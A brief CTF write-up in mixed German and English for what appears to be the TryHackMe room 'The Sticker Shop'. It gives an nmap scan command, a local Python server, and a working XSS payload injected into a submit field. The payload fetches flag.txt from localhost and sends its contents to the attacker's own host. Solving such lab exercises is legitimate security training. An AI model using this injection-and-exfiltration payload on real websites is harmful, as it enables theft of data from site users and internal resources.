Zusammenfassung:

The Sticker Shop

1. step: website auf offene ports gescanned mit: nmap -A -F -oN nmap.txt 10.10.253.194

2. step: port 8080 ermittelt

3. step: lokalen server erstellt auf port 8000 -> python3 -m http.server <lokale-ip>

4. step: seite aufgerufen und html injection im submit field geused mit folgendem code:

<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then (data => {fetch('http://10.10.93.80:8000/?flag=' + encodeURIComponent(data));});
</script>

5. step: die lokale Loopback IPv4 zu accessed um die flag.txt (THM{****}) zu kriegen und die response
dann in einen string umgewandelt und in "data" gestored und auf meinen lokalen python3 server abgegriffen